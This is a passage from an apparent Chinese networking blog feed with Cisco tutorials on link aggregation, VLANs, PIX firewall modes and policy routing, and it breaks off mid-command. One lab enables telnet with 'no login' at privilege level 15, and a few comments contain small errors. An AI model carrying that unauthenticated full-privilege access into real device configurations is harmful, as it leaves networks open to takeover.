    <title>链路聚合</title>
    <link href="http://yoursite.com/2019/09/23/%E9%93%BE%E8%B7%AF%E8%81%9A%E5%90%88/"/>
    <id>http://yoursite.com/2019/09/23/链路聚合/</id>
    <published>2019-09-23T02:59:03.562Z</published>
    <updated>2019-08-25T13:14:59.486Z</updated>
    
    <content type="html"><![CDATA[<h1 id="以太网链路聚合："><a href="#以太网链路聚合：" class="headerlink" title="以太网链路聚合："></a>以太网链路聚合：</h1><p>链路聚合又称为端口聚合，端口捆绑，英文名porttrunking。是一种聚合多个物理接口 ( that ) 创建一个逻辑接口。你可以捆扎( bundle ) 八个单独的活动链接到一个信道端口，以提供更高的带宽和冗余。端口通道也负载平衡这些物理接口上的通信量。只要端口通道中的至少一个物理接口可操作，端口通道就可以保持运行</p><h3 id="channel-group模式与说明："><a href="#channel-group模式与说明：" class="headerlink" title="channel-group模式与说明："></a>channel-group模式与说明：</h3><p>PAgP 是 Cisco私有，只能在 Cisco Switch 上设定，PAgP 有两个模式，分別是 Desirable 与 Auto当 PAgP 成功建立 EtherChannel 后，PAgP Message 会继续定时传送去维持 EtherChannel </p><hr><p>​                        Desirable      Auto</p><p>Desirable           √                  √               主动发送PAgP报文</p><p>Auto                    √                  x               被动发送PAgP报文</p><p>On                                                            手动设置，需要两边都设置</p><p><code>LACP 是 IEEE Standard</code></p><hr><p>​                            Active         Passive</p><p>Active                    √                 √             主动发送LACP报文</p><p>Passive                  √                x              主动接收LACP报文</p><hr><p>（1）Cisco最多允许EtherChannel绑定8个端口；如果是百兆网络，总带宽可达1.6Gbit/s；如果是千兆网络，总带宽可达16Gbit/s。</p><p>（2）EtherChannel不支持10M端口；</p><p>（3）EtherChannel编号只在本地有效，链路两端的编号可以不一样；</p><p>（4）EtherChannel默认使用PAgP协议；</p><p>（5）EtherChannel默认情况下是基于源MAC地址的负载平衡；</p><p>（6）一个EtherChannel内所有的端口都必须具有相同的端口速率和双工模式，LACP只能是全双工模式；</p><p>（7）channel-group接口会自动继承最小物理接口，或最先配置的接口模式；</p><p>（8）cisco的交换机不仅可以支持第二层EtherChannel,还可以支持第三层EtherChannel。</p><h3 id="配置端口聚合："><a href="#配置端口聚合：" class="headerlink" title="配置端口聚合："></a>配置端口聚合：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Switch(config)#int port-channel 1//启用编号为1的聚合端口</span><br><span class="line">Switch(config-if)#switchport mode trunk//设置端口模式为trunk</span><br><span class="line">Switch(config)#int range f0/1-2//进入物理端口</span><br><span class="line">Switch(config-if)#switchport mode trunk//设置端口模式为trunk</span><br><span class="line">Switch(config-if-range)#channel-group 1 mode on//将物理端口加入聚合端口，模式为on</span><br></pre></td></tr></table></figure><h3 id="配置端口聚合的流量均衡："><a href="#配置端口聚合的流量均衡：" class="headerlink" title="配置端口聚合的流量均衡："></a>配置端口聚合的流量均衡：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Switch(config)#int f0/1</span><br><span class="line">Switch(config-if)#spanning-tree vlan 10 port-priority 16</span><br><span class="line">Switch(config-if)#spanning-tree vlan 20 port-priority 32</span><br><span class="line">Switch(config)#int f0/2</span><br><span class="line">Switch(config-if)#spanning-tree vlan 10 port-priority 32</span><br><span class="line">Switch(config-if)#spanning-tree vlan 20 port-priority 16</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;以太网链路聚合：&quot;&gt;&lt;a href=&quot;#以太网链路聚合：&quot; class=&quot;headerlink&quot; title=&quot;以太网链路聚合：&quot;&gt;&lt;/a&gt;以太网链路聚合：&lt;/h1&gt;&lt;p&gt;链路聚合又称为端口聚合，端口捆绑，英文名porttrunking。是一种聚合多个物理接口 (
      
    
    </summary>
    
      <category term="系统安全" scheme="http://yoursite.com/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="网络设计及扩展" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E8%AE%BE%E8%AE%A1%E5%8F%8A%E6%89%A9%E5%B1%95/"/>
    
      <category term="网络协议" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/"/>
    
  </entry>
  
  <entry>
    <title>交换机工作原理及VLAN</title>
    <link href="http://yoursite.com/2019/09/23/%E4%BA%A4%E6%8D%A2%E6%9C%BA%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E5%8F%8AVLAN/"/>
    <id>http://yoursite.com/2019/09/23/交换机工作原理及VLAN/</id>
    <published>2019-09-23T02:59:03.559Z</published>
    <updated>2019-09-03T06:34:51.342Z</updated>
    
    <content type="html"><![CDATA[<h1 id="数据链路层与交换机："><a href="#数据链路层与交换机：" class="headerlink" title="数据链路层与交换机："></a>数据链路层与交换机：</h1><h3 id="数据链路层："><a href="#数据链路层：" class="headerlink" title="数据链路层："></a>数据链路层：</h3><p>数据链路层是位于网络层与物理层之间的层次，其中，以太网就是工作在数据链路层，在数据链路层中，数据是以帧的形式传输的。</p><h3 id="以太网MAC地址："><a href="#以太网MAC地址：" class="headerlink" title="以太网MAC地址："></a>以太网MAC地址：</h3><p>以太网地址用来识别一个以太网上的某个单独的设备或一组设备，又称物理地址。</p><p>MAC地址是由<code>48位二进制数组成</code>的，以<code>十六进制数表示</code>。前24位称为OUI（组织唯一标识符），后24位是厂商对网卡的唯一编号，第8位如果是0表示单播地址，是1表示组播地址。</p><p>交换机有一个基本MAC地址，每一个端口对应一个MAC地址。</p><h3 id="以太网帧格式："><a href="#以太网帧格式：" class="headerlink" title="以太网帧格式："></a>以太网帧格式：</h3><p><img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g66akwcflqj30io05zdfw.jpg" alt></p><p>类型长度：0x0800为IPv4地址，0x86DD为IPv6地址</p><p>FCS：帧校验序列</p><h3 id="MAC子层与LLC子层："><a href="#MAC子层与LLC子层：" class="headerlink" title="MAC子层与LLC子层："></a>MAC子层与LLC子层：</h3><p><strong>介质访问控制（MAC）</strong>子层（802.3）</p><p>⚫将上层交下来的数据封装成帧迚行发送(接收时迚行相反的过程，将帧拆卸)</p><p>⚫实现和维护介质访访问控制协议，例如CSMA/CD</p><p>⚫比特差错检测</p><p>⚫MAC帧的寻址，即MAC帧由哪个站（源站）收出，被哪个站／哪些站接收（目的站）</p><p><strong>逻辑链路控制（LLC）</strong>子层（802.2）</p><p>⚫建立和释放数据链路层的逻辑连接</p><p>⚫提供不上层的接口</p><p>⚫给帧加上序号</p><h3 id="以太网命名方法："><a href="#以太网命名方法：" class="headerlink" title="以太网命名方法："></a>以太网命名方法：</h3><p><code>N－信号－物理介质</code></p><p><code>N：</code>以兆位为单位的数据速率，如10、100、1000</p><p><code>信号：</code>基带还是宽带</p><p><code>物理介质：</code>标识介质类型</p><p><strong>举例：100BASE-TX</strong></p><table><thead><tr><th>类型</th><th>接口</th><th>传输介质</th><th>标准</th></tr></thead><tbody><tr><td>标准以太网</td><td>10Base-T</td><td>双绞线</td><td>IEEE 802.3</td></tr><tr><td>标准以太网</td><td>10Base5</td><td>粗同轴电缆</td><td>IEEE 802.3</td></tr><tr><td>标准以太网</td><td>10Base2</td><td>细同轴电缆</td><td>IEEE 802.3</td></tr><tr><td>快速以太网</td><td>100Base-TX</td><td>双绞线</td><td>IEEE 802.3u</td></tr><tr><td>快速以太网</td><td>100Base-FX</td><td>光纤</td><td>IEEE 802.3u</td></tr><tr><td>千兆以太网</td><td>1000Base-T</td><td>双绞线</td><td>IEEE 802.3ab、IEEE 802.3z</td></tr><tr><td>千兆以太网</td><td>1000Base-SX</td><td>多模光纤</td><td>IEEE 802.3ab、IEEE 802.3z</td></tr><tr><td>千兆以太网</td><td>1000Base-LX</td><td>单模光纤</td><td>IEEE 802.3ab、IEEE 802.3z</td></tr></tbody></table><h3 id="以太网交换机："><a href="#以太网交换机：" class="headerlink" title="以太网交换机："></a>以太网交换机：</h3><p>交换机是用来连接局域网的主要设备</p><p>交换机能够根据以太网帧中目标地址智能的转发数据，因此交换机工作在数据链路层</p><p>交换机分割冲突域，实现全双工通信</p><hr><h1 id="交换机的数据转发原理："><a href="#交换机的数据转发原理：" class="headerlink" title="交换机的数据转发原理："></a>交换机的数据转发原理：</h1><h3 id="交换机的转发原理："><a href="#交换机的转发原理：" class="headerlink" title="交换机的转发原理："></a>交换机的转发原理：</h3><p><strong>转发</strong></p><p>   交换机根据MAC地址表单播转数据帧</p><p><strong>学习</strong></p><p>   MAC地址表是交换机通过学习接收的数据帧的源MAC地址来形成的</p><p><strong>广播</strong></p><p>   如果目标地址在MAC地址表中没有，交换机就向除接收到该数据帧的端口外的其他所有端口广播该数据帧</p><p><strong>更新</strong></p><p>   交换机MAC地址表的老时间是300秒</p><p>   交换机如果发现一个帧的入端口和MAC地址表中源MAC地址的所在端口不同，交换机将MAC地址重新学习到新的端口。</p><hr><p><img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g66b0qxsymj30eu078dgj.jpg" alt></p><p><strong>举例1</strong>：主机11给主机33发送一个数据帧</p><p>​    <strong>交换机A</strong>：在接收到数据帧后，执行以下操作：</p><p>​            交换机A查找MAC地址表</p><p>​            交换机A学习主机11的MAC地址</p><p>​            交换机A向其他所有端口发送广播</p><p>​    <strong>主机22</strong>：查看数据包的目标MAC地址不是自己，丢弃数据包</p><p>​    <strong>交换机B</strong>：在接收到数据帧后，执行以下操作：</p><p>​            交换机B查看MAC地址表</p><p>​            交换机B学习源MAC地址和端口号</p><p>​            交换机B向所有端口广播数据包</p><p>​    <strong>主机33</strong>：接收到数据帧</p><p>​    <strong>主机44</strong>：弃数据帧</p><p><strong><code>在这个过程中，交换机的MAC地址表中没有需要的条目，交换机通过广播方式转发了数据帧</code></strong></p><p><strong>举例2</strong>：主机44给主机11发送一个数据帧</p><p>​    <strong>交换机B</strong>：在接收到数据帧后，执行以下操作：</p><p>​        交换机B查看MAC地址表</p><p>​        交换机B学习源MAC地址和端口号</p><p>​        交换机B直接从端口1发送给交换A</p><p>​    <strong>交换机A</strong>：在接收到数据帧后，执行以下操作：</p><p>​        交换机A查找MAC地址表</p><p>​        交换机A学习源MAC地址和端口号</p><p>​        交换机A直接向11转发数据</p><p>​    <strong>主 机11</strong>：接收到数据帧 </p><p><strong><code>在这个过程中，交换机的MAC地址表中已经学到了需要的条目，交换机通过单播的方式，转发了数据帧</code></strong></p><hr><h3 id="单工、半双工、全双工："><a href="#单工、半双工、全双工：" class="headerlink" title="单工、半双工、全双工："></a>单工、半双工、全双工：</h3><p><strong>单工：</strong>只有一个信道，传输方向只能是单向的</p><p><strong>半双工：</strong>只有一个信道，在同一时刻，只能是单向传输</p><p><strong>全双工：</strong>双信道，同时可以有双向数据传输</p><h3 id="冲突、冲突域、广播域："><a href="#冲突、冲突域、广播域：" class="headerlink" title="冲突、冲突域、广播域："></a>冲突、冲突域、广播域：</h3><p>集线器所有端口在一个冲突域，如果冲突过多，则传输效率就会降低、交换机分割冲突域，因为一个接口一个冲突域。</p><p>广播域指接收同样广播消息的节点的集合，如：在该集合中的任何一个节点传输一个广播帧，则所有其他能收到这个帧的节点都认为是广播帧的一部份。</p><p>交换机分割冲突域，但是不分割广播域，即交换机的所有端口属于同一个广播域。</p><hr><h1 id="交换机的基本配置："><a href="#交换机的基本配置：" class="headerlink" title="交换机的基本配置："></a>交换机的基本配置：</h1><h3 id="交换机访问方法："><a href="#交换机访问方法：" class="headerlink" title="交换机访问方法："></a>交换机访问方法：</h3><p>一般分为本地配置和远程配置两种方式，本地配置一般采用console端口连接，远程配置方式有telnet、ssh等连接方式。</p><h3 id="端口安全："><a href="#端口安全：" class="headerlink" title="端口安全："></a>端口安全：</h3><p>指对交换机的端口进行安全属性的配置，从而控制用户的安全接入。交换机端口安全主要有两种类型</p><p>一是限制交换机端口的最大连接数，从而控制交换机端口下连接的主机数，防止用户进行恶意的ARP（地址解析协议，即<em>ARP</em>【Address Resolution Protocol】）欺骗</p><p>二是针对交换机端口执行MAC地址、IP地址的绑定，从而实现对用户的严格控制。</p><p>对安全违例的处理方式有以下3种。</p><p>​         ① protect  当安全地址个数满后，安全端口将丢弃未知名的地址包</p><p>​         ② restrict  当违例产生时，将发送一个Trap通知</p><p>​         ③ shutdown 当违例产生时，将关闭端口并发送一个Trap通知</p><p> trap，指被管理设备（代理）上报的陷阱报文，表明设备发生故障或变更的主动通知</p><p><strong>交换机端口安全功能只能在Access接口进行配置！！</strong></p><p><strong>配置实例：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">switch&gt;enable</span><br><span class="line">switch#config terminal</span><br><span class="line">switch(config)#int loopback 0//创建环回接口</span><br><span class="line">switch(config-if)#ip address 1.1.1.1 255.255.255.0//配置环回接口地址</span><br><span class="line">switch(config)#int fastethernet 0/1</span><br><span class="line">switch(config-if)#speed 100//设置fastethernet0/1端口速率为10Mbit/s</span><br><span class="line">switch(config-if)#duplex full//设置fastethernet0/1端口为全双工</span><br><span class="line">switch(config-if)#no shutdown//启用端口</span><br><span class="line">switch(config-if)#switchport mode access//设置当前端口为Access</span><br><span class="line">Switch(config-if)#switchport port-security//打开当前端口安全功能</span><br><span class="line">Switch(config-if)#switchport port-security maximum 1//设置端口安全地址的最大个数</span><br><span class="line">Switch(config-if)#switchport port-security violation shutdown//配置处理违例的方式</span><br><span class="line">Switch(config-if)#switchport port-security mac-address 0001.C7E9.6EC0//配置安全地址</span><br><span class="line">Switch(config-if)#switchport port-security violation shutdown   //配置处理违例的方式</span><br></pre></td></tr></table></figure><hr><h1 id="VLAN概述："><a href="#VLAN概述：" class="headerlink" title="VLAN概述："></a>VLAN概述：</h1><p>VLAN（Virtual Local Area Network）的中文名为”虚拟局域网”，虚拟局域网（VLAN）是一组逻辑上的设备和用户，这些设备和用户并不受物理位置的限制，可以根据功能、部门及应用等因素将它们组织起来，相互之间的通信就好像它们在同一个网段中一样，由此得名虚拟局域网。</p><p>交换机的所有端口都在一个广播域，如果计算机数量增多会产生广播风暴。为了避免广播风暴，在交换机上可以采用<strong>虚拟局域网技术</strong>（Vlan）</p><p><strong>配置实例：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">划分Vlan:</span><br><span class="line">Switch#config </span><br><span class="line">Switch(config)#vlan 10</span><br><span class="line"></span><br><span class="line">修改vlan名称：</span><br><span class="line">Switch(config)#vlan 40</span><br><span class="line">Switch(config-vlan)#name rsb</span><br><span class="line"></span><br><span class="line">将端口加入到vlan:</span><br><span class="line">Switch(config)#int f0/1</span><br><span class="line">Switch(config-if)#switchport mode access</span><br><span class="line">Switch(config-if)#switchport access vlan 10</span><br><span class="line"></span><br><span class="line">查看vlan配置信息：</span><br><span class="line">Switch#sh vlan brief</span><br></pre></td></tr></table></figure><hr><h1 id="VLAN间通信："><a href="#VLAN间通信：" class="headerlink" title="VLAN间通信："></a>VLAN间通信：</h1><h3 id="Trunk技术："><a href="#Trunk技术：" class="headerlink" title="Trunk技术："></a>Trunk技术：</h3><p><strong>（1）封装</strong> </p><p>​      ISL（思科私有）：是在数据帧前加26字节，尾加4字节</p><p>​      802.1Q（工业标准）：是在数据帧中插入4字节，打标签</p><p>​      802.1Q Native Vlan：默认vlan1不打标，作管理用</p><p><strong>（2）模式</strong></p><table><thead><tr><th>Mode</th><th>DTP send</th><th>DTP Response</th></tr></thead><tbody><tr><td>Access</td><td>-</td><td>-</td></tr><tr><td>Trunk</td><td>Y</td><td>Y</td></tr><tr><td>Desirable(企望)</td><td>Y</td><td>Y</td></tr><tr><td>Auto(自动)</td><td>N</td><td></td></tr><tr><td>Nonegotiate(不协商)</td><td>N</td><td>N</td></tr></tbody></table><p><strong>（3）查看trunk信息</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Switch(config-if)#switchport mode trunk</span><br><span class="line">Switch#show interfaces trunk</span><br><span class="line">Switch(config-if)# switchport trunk allowed vlan 10</span><br><span class="line">Switch(config-if)# switchport trunk native vlan1 //本征vlan</span><br></pre></td></tr></table></figure><p><strong>（4）不同vlan间通信</strong></p><p>使用三层交换机，起SVI接口，打开路由</p><p><strong>单臂路由 ：</strong></p><p>①使用三层交换机实现不同vlan间通信</p><p>​    </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">第一步：trunk链路</span><br><span class="line">Switch(config-if)#switchport trunk encapsulation dot1q </span><br><span class="line"></span><br><span class="line">第二步：划分vlan</span><br><span class="line">Switch(config)#vlan 10</span><br><span class="line">Switch(config-vlan)#vlan 20</span><br><span class="line"></span><br><span class="line">第三步：开启SVI接口作为相应vlan客户端的网关</span><br><span class="line">Switch(config)#int vlan 10</span><br><span class="line">Switch(config-if)#ip add 192.168.10.254 255.255.255.0</span><br><span class="line">Switch(config-if)#no shutdown </span><br><span class="line">Switch(config)#int vlan 20</span><br><span class="line">Switch(config-if)#ip add 192.168.20.254 255.255.255.0</span><br><span class="line">Switch(config-if)#no shutdown</span><br><span class="line"></span><br><span class="line">第四步：开启三层交换机路由功能</span><br><span class="line">Switch(config)#ip routing   //开启三层交换机路由功能 </span><br><span class="line"></span><br><span class="line">第五步：为客户机设置网关地址</span><br></pre></td></tr></table></figure><p><strong>SVI：svi是联系vlan的ip接口，一个svi只能和一个vlan相联系</strong></p><h3 id="VTP技术："><a href="#VTP技术：" class="headerlink" title="VTP技术："></a>VTP技术：</h3><p>VTP（VLAN Trunking Protocol）：是VLAN中继协议，也被称为虚拟局域网干道协议。它是思科私有协议。作用是十几台交换机在企业网中，配置VLAN工作量大，可以使用VTP协议，把一台交换机配置成VTP Server, 其余交换机配置成VTP Client,这样他们可以自动学习到server 上的VLAN 信息。</p><p>vtp有三种模式：分别是服务器模式（Server）、客户机模式（Client）、透明模式（Transparent）</p><p>基本命令：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Switch(config)#hostname S1//设置主机名</span><br><span class="line">Switch(config)#vtp domain s1.com//设置域名</span><br><span class="line">Switch(config)#vtp mode server/client/transparent//设置模式</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;数据链路层与交换机：&quot;&gt;&lt;a href=&quot;#数据链路层与交换机：&quot; class=&quot;headerlink&quot; title=&quot;数据链路层与交换机：&quot;&gt;&lt;/a&gt;数据链路层与交换机：&lt;/h1&gt;&lt;h3 id=&quot;数据链路层：&quot;&gt;&lt;a href=&quot;#数据链路层：&quot; class=&quot;
      
    
    </summary>
    
      <category term="系统安全" scheme="http://yoursite.com/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="网络设计及扩展" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E8%AE%BE%E8%AE%A1%E5%8F%8A%E6%89%A9%E5%B1%95/"/>
    
  </entry>
  
  <entry>
    <title>防火墙简单配置</title>
    <link href="http://yoursite.com/2019/09/23/%E9%98%B2%E7%81%AB%E5%A2%99%E7%AE%80%E5%8D%95%E9%85%8D%E7%BD%AE/"/>
    <id>http://yoursite.com/2019/09/23/防火墙简单配置/</id>
    <published>2019-09-23T02:59:03.556Z</published>
    <updated>2019-09-22T03:20:15.331Z</updated>
    
    <content type="html"><![CDATA[<h1 id="防火墙配置实例："><a href="#防火墙配置实例：" class="headerlink" title="防火墙配置实例："></a>防火墙配置实例：</h1><h3 id="防火墙的三种模式："><a href="#防火墙的三种模式：" class="headerlink" title="防火墙的三种模式："></a>防火墙的三种模式：</h3><p><strong>路由模式：</strong></p><p>当防火墙位于内部网络和外部网络之间时，需要将防火墙与内部网络、外部网络以及DMZ 三个区域相连的接口分别配置成不同网段的IP 地址，重新规划原有的网络拓扑，此时相当于一台路由器。</p><p>采用路由模式时，可以完成ACL 包过滤、ASPF 动态过滤、NAT 转换等功能。然而，路由模式需要对网络拓扑进行修改（内部网络用户需要更改网关、路由器需要更改路由配置等），这是一件相当费事的工作，因此在使用该模式时需权衡利弊。</p><p><strong>透明模式：</strong></p><p>如果防火墙采用透明模式进行工作，则可以避免改变拓扑结构造成的麻烦，此时防火墙对于子网用户和路由器来说是完全透明的。也就是说，用户完全感觉不到防火墙的存在。</p><p>采用透明模式时，只需在网络中像放置网桥（bridge）一样插入该防火墙设备即可，无需修改任何已有的配置。与路由模式相同，IP 报文同样经过相关的过滤检查（但是IP 报文中的源或目的地址不会改变），内部网络用户依旧受到防火墙的保护。</p><p><strong>混合模式：</strong></p><p>如果防火墙既存在工作在路由模式的接口（接口具有IP 地址），又存在工作在透明模式的接口（接口无IP 地址），则防火墙工作在混合模式下。混合模式主要用于透明模式作双机备份的情况，此时启动VRRP（Virtual Router Redundancy Protocol，虚拟路由冗余协议）功能的接口需要配置IP 地址，其它接口不配置IP地址。</p><hr><h3 id="配置实例："><a href="#配置实例：" class="headerlink" title="配置实例："></a>配置实例：</h3><p><strong>透明模式配置实例：</strong></p><p>实验拓扑：</p><p><img src="https://ws1.sinaimg.cn/large/006bOYmUgy1g783xsbh1mj30o30blmxm.jpg" alt></p><p>防火墙配置（透明模式）：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pixfirewall(config)# firewall transparent</span><br><span class="line">pixfirewall(config)# ip add 10.0.0.3 255.255.255.248</span><br><span class="line">pixfirewall(config)# int e 0</span><br><span class="line">pixfirewall(config-if)# nameif inside</span><br><span class="line">pixfirewall(config-if)# security-level 100</span><br><span class="line">pixfirewall(config-if)# no shutdown</span><br><span class="line">pixfirewall(config)# int e 1</span><br><span class="line">pixfirewall(config-if)# nameif outside</span><br><span class="line">pixfirewall(config-if)# security-level 0</span><br><span class="line">pixfirewall(config)# no shutdown</span><br><span class="line">pixfirewall(config)# access-list 110 permit icmp any any</span><br><span class="line">pixfirewall(config)# access-group 110 in interface inside</span><br><span class="line">pixfirewall(config)# access-group 110 in interface outside</span><br></pre></td></tr></table></figure><p><strong>路由模式配置实例：</strong></p><p>实验拓扑：</p><p><img src="https://ws1.sinaimg.cn/large/006bOYmUgy1g784az94drj30oa07haam.jpg" alt></p><p>防火墙配置（路由模式）：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pixfirewall(config)# int e 0</span><br><span class="line">pixfirewall(config-if)# nameif inside</span><br><span class="line">pixfirewall(config-if)# security-level 100</span><br><span class="line">pixfirewall(config-if)# ip add 10.0.0.2 255.255.255.252</span><br><span class="line">pixfirewall(config-if)# no shutdown</span><br><span class="line">pixfirewall(config)# int e 1</span><br><span class="line">pixfirewall(config-if)# nameif outside</span><br><span class="line">pixfirewall(config-if)# security-level 0</span><br><span class="line">pixfirewall(config-if)# ip add 61.1.1.1 255.255.255.0</span><br><span class="line">pixfirewall(config-if)# no shutdown</span><br><span class="line">pixfirewall(config)# route inside 192.168.1.0 255.255.255.0 10.0.0.2</span><br><span class="line">pixfirewall(config)# route outside 0.0.0.0 0.0.0.0 61.1.1.2</span><br><span class="line">pixfirewall(config)# access-list 1 permit icmp any any</span><br><span class="line">pixfirewall(config)# access-group 1 in interface outside</span><br><span class="line">pixfirewall(config)# nat (inside) 1 192.168.1.0 255.255.255.0</span><br><span class="line">pixfirewall(config)# global (outside) 1 interface</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;防火墙配置实例：&quot;&gt;&lt;a href=&quot;#防火墙配置实例：&quot; class=&quot;headerlink&quot; title=&quot;防火墙配置实例：&quot;&gt;&lt;/a&gt;防火墙配置实例：&lt;/h1&gt;&lt;h3 id=&quot;防火墙的三种模式：&quot;&gt;&lt;a href=&quot;#防火墙的三种模式：&quot; class=&quot;he
      
    
    </summary>
    
      <category term="系统安全" scheme="http://yoursite.com/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="防火墙" scheme="http://yoursite.com/tags/%E9%98%B2%E7%81%AB%E5%A2%99/"/>
    
  </entry>
  
  <entry>
    <title>策略路由</title>
    <link href="http://yoursite.com/2019/09/23/%E7%AD%96%E7%95%A5%E8%B7%AF%E7%94%B1/"/>
    <id>http://yoursite.com/2019/09/23/策略路由/</id>
    <published>2019-09-23T02:59:03.553Z</published>
    <updated>2019-09-17T03:36:11.731Z</updated>
    
    <content type="html"><![CDATA[<h1 id="策略路由："><a href="#策略路由：" class="headerlink" title="策略路由："></a>策略路由：</h1><p>策略路由提供了一种根据网络管理者制定的策略来进行数据包转发的机制。基于策略的路由比传统路由能力更强，使用更灵活，它使用网络管理者不仅能够根据目的地址，而且能够根据协议类型、报文大小、应用或IP源地址来选择转发路径。策略由路由映射表来定义。</p><h3 id="实验一、基于源IP地址的策略路由配置"><a href="#实验一、基于源IP地址的策略路由配置" class="headerlink" title="实验一、基于源IP地址的策略路由配置"></a>实验一、基于源IP地址的策略路由配置</h3><p><strong>实验目的：</strong></p><p>1、用route-map定义路由策略</p><p>2、在接口下应用路由策略</p><p>3、基于源IP地址的策略路由的配置和调试</p><p><strong>实验拓扑：</strong></p><p><img src="https://ws1.sinaimg.cn/large/006bOYmUgy1g72cr35esmj30m609wdg9.jpg" alt></p><p><strong>实验步骤：</strong></p><p>在路由器R1的f0/0接口应用IP策略路由CCNA，使得从主机PC2来的数据设置一跳地址为：172.16.12.2；从主机PC3来的数据设置下一跳地址为：172.16.21.2，所有其他的数据包正常转发，整个网络运行EIGRP路由协议。</p><p><code>配置ACL</code></p><p>R1(config)#access-list 1 permit 172.16.1.2</p><p>R1(config)#access-list 2 permit 172.16.1.3</p><p><code>配置路由映射表</code></p><p>R1(config)#route-map CCNA permit 10</p><p>R1(config-route-map)#match ip address 1</p><p>R1(config-route-map)#set ip next-hop 172.16.12.2</p><p>R1(config-route-map)#exit</p><p>R1(config)#route-map CCNA permit 20</p><p>R1(config-route-map)#match ip address 2</p><p>R1(config-route-map)#set ip next-hop 172.16.21.2</p><p><code>应用策略路由</code></p><p>R1(config)#int f0/0</p><p>R1(config-if)#ip policy route-map CCNA</p><p><strong>实验调试：</strong></p><p>1、查看路由路径</p><p>​    PC2#traceroute 172.16.2.2</p><p>​    PC3#traceroute 172.16.2.2</p><p>2、在R1上显示调试信息</p><p>​    R1#debug ip policy</p><p>​    PC2：ping 172.16.2.2  </p><p>​    PC6:ping 172.16.2.2</p><p>3、显示在哪些接口上应用了策略路由</p><p>​    R1#sh ip policy</p><p>4、显示定义的所有路由策略及路由策略匹配的情况</p><hr><h3 id="实验二、基于数据包长度的策略路由配置"><a href="#实验二、基于数据包长度的策略路由配置" class="headerlink" title="实验二、基于数据包长度的策略路由配置"></a>实验二、基于数据包长度的策略路由配置</h3><p><strong>实验目的：</strong></p><p>1、用route-map定义路由策略</p><p>2、在接口下应用路由策略</p><p>3、基于数据包长度的策略路由的配置和调试</p><p><strong>实验拓扑：</strong></p><p><img src="https://ws1.sinaimg.cn/large/006bOYmUgy1g72cv2jjtyj30m609wdg9.jpg" alt></p><p><strong>实验步骤：</strong></p><p>在R1的f0/0接口应用IP策略路由CCNP，使得对大小为“64-100”字节的数据包设置出接口为s1/0;数据包大小“101-100”字节的数据包设置出接口为“f0/1”,所有其他的数据包正常转发，整个网络运行EIGRP路由协议。</p><p><code>配置路由映射表</code></p><p>R1(config)#route-map CCNP permit 10</p><p>R1(config-route-map)#match length 64 100</p><p>R1(config-route-map)#set interface s1/0</p><p>R1(config)#route-map CCNP permit 20</p><p>R1(config-route-map)#match length 101 1000</p><p>R1(config-route-map)#set interface f0/1</p><p><code>应用策略路由</code></p><p>R1(config)#int f0/0</p><p>R1(config-if)#ip policy route-map CCNP</p><p>R1(config-if)#exit</p><p>R1(config)#ip local policy route-map CCNP</p><p><strong>实验调试：</strong></p><p>1.在主机上执行扩展ping命令，在R1上显示调试信息。</p><p>​    PC2：ping 172.16.2.2 repeat 1 size 90</p><p>​    PC2：ping 172.16.2.2 repeat 1 size 300</p><p>​    PC2：ping 172.16.2.2 repeat 1 size 1200</p><p>2、显示在哪些接口上应用了策略路由</p><p>​    R1#sh ip policy</p><p>3、显示定义的所有路由策略及路由策略匹配的情况</p><p>​    R1#sh route-map CCNP</p><hr><h3 id="实验三、基于应用的策略路由配置"><a href="#实验三、基于应用的策略路由配置" class="headerlink" title="实验三、基于应用的策略路由配置"></a>实验三、基于应用的策略路由配置</h3><p><strong>实验目的：</strong></p><p>1、用route-map定义路由策略</p><p>2、在接口下应用路由策略</p><p>3、基于数据包长度的策略路由的配置和调试</p><p><strong>实验拓扑：</strong></p><p><img src="https://ws1.sinaimg.cn/large/006bOYmUgy1g72cyv5zc6j30m609wdg9.jpg" alt></p><p><strong>实验步骤：</strong></p><p>在R1的f0/0接口应用IP策略路由CCIE，使得对HTTP数据包设置一跳地址为：172.16.12.2，并且设置IP数据包优先级为”flash”,为telnet数据包设置下一跳地址为：172.16.21.2，并且设置IP数据包优先级为：critical，所有其他的数据包正常转发，整个路由协议运行EIGRP。</p><p><code>配置R2的http与telnet访问</code></p><p>R2(config)#ip http server</p><p>R2(config)#line vty 0 4</p><p>R2(config-line)#no login</p><p>R2(config-line)#privilege level 15</p><p><code>配置扩展ACL</code></p><p>R1(config)#ip access-list extended HTTP</p><p>R1(config-ext-nacl)#permit tcp any any eq 80</p><p>R1(config-ext-nacl)#exit</p><p>R1(config)#ip access-list extended TELNET</p><p>R1(config-ext-nacl)#permit tcp any any eq 23</p><p><code>配置路由映射表</code></p><p>R1(config)#route-map CCIE permit 10</p><p>R1(config-route-map)#match ip address HTTP</p><p>R1(config-route-map)#set ip precedence flash</p><p>R1(config-route-map)#set ip next-hop 172.16.12.2</p><p>R1(config)#route-map CCIE permit 20</p><p>R1(config-route-map)#match ip address TELNET</p><p>R1(config-route-map)#set ip precedence critical</p><p>R1(config-route-map)#set ip next-hop 